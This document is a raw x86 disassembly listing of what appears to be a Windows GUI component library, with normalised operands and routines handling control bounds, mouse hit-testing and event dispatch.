mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_44b30c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_44b2d0
push ebp
call sub_44b2dc
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44b35c
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_44b3e8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_44b420
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_44aea0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_46099c
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403350
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_46099c
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403350
sub_44b4a4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_449990
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_44a058
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_44b420
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_44b4f0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_449990
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_44b50c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_449990
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_44a058
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44b420
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_403350
sub_44b564
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_44ae40
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_44add4
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_44ae40
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_44b600
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_44b420
pop esi
pop ebx
retn
sub_44b625
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_44b420
pop esi
pop ebx
retn
sub_44b64b
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_44b420
pop esi
pop ebx
retn
sub_44b675
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_44b420
pop esi
pop ebx
retn
sub_44b69b
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_44b6d0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_44aea0
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_46099c
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_403350
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_46099c
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_403350
sub_44b748
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_44b780
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_46099c
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_403350
sub_44b7b8
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_44a058
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44b780
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406b30
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403350
sub_44b830
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_44b780
pop esi
pop ebx
retn
sub_44b850
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_44b780
pop esi
pop ebx
retn
sub_44b870
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_46099c
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_403350
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_455094
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44b8c8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44a048
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_44a058
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_44afd4
pop esi
retn
sub_44b908
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_44b008
sub_44b9b6
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_44a268
mov cl 0x1
sub_44b9f8
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_449fc0
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_449fc0
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_44ba28
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_44ba4c
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_406b30
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_403350
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_44afd4
mov [ ebx + 0xc ] eax
sub_44baf0
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_449f14
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_449f14
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_44bb84
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_40309c
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_4495b4
mov edx [ esp ]
mov eax esi
call sub_449590
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_44983c
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_449880
sub_44bc08
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_416efc
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_449938
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_416f4c
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_4497e0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44bc94
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_44bb84
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_45071c
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_44bc08
pop ecx
jmp r-xdata
sub_44bcf4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_44bde2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bde9
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f74
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_449e50
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_449e20
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_449e20
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_40435c
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_403fa4
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_449d40
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_44bdf0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_403350
sub_44be1c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44be3c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44be5c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44be7c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44be9c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44bebc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44bedc
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_42141c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_449474
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403350
sub_44bf14
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44bfb0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418c90
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_456618
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_456750
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_449e20
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4564b0
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_456870
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bfb7
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_44bfc0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_44bffc
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_44bfc0
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_44c0ac
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_4032e0
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_44c0e0
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_44c100
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_403350
test al al
je r-xdata
mov eax edi
call sub_44c140
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_44c16c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_44c198
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_406b30
mov eax esp
call sub_416f74
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_449964
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_403350
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_403350
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_449990
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_416f74
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_416efc
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_449938
sub_44c2c0
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_44c300
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_44c402
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx [ eax + 0x4 ]
mov [ ebx + 0x4 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
add [ ebx ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
add [ ebx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
